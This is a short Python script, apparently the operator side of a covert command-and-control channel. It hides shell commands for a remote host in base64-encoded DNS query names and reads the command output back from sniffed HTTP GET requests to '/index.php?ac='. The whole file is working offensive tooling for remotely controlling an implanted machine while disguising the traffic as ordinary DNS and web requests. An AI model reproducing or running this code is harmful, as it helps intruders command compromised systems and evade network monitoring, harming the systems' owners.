#!/usr/bin/python

import os, sys, time, base64, random
from scapy.all import *

cmd = sys.argv[1]
bob = sys.argv[2]

enccmd = ((base64.b64encode(cmd)).replace('==','.com')).replace('=','.net')
if "." not in enccmd:
	enccmd = enccmd+".org"
txid = random.getrandbits(8)+(0xff<<8)

pkt2=IP(dst=bob)/UDP()/DNS(id=txid, qd=DNSQR(qname=enccmd))
send(pkt2)

def do_that(bobrsp):
	bobout,httpstr = ((str(bobrsp[Raw])).replace('GET /index.php?ac=','')).split('HTTP')
	bobout = base64.b64decode(bobout)
	print "Bob replies:\r\n" + bobout

catchbob = "host " + bob + " and tcp port 80"

bobin = sniff(count=1, prn=do_that, filter=catchbob)
	
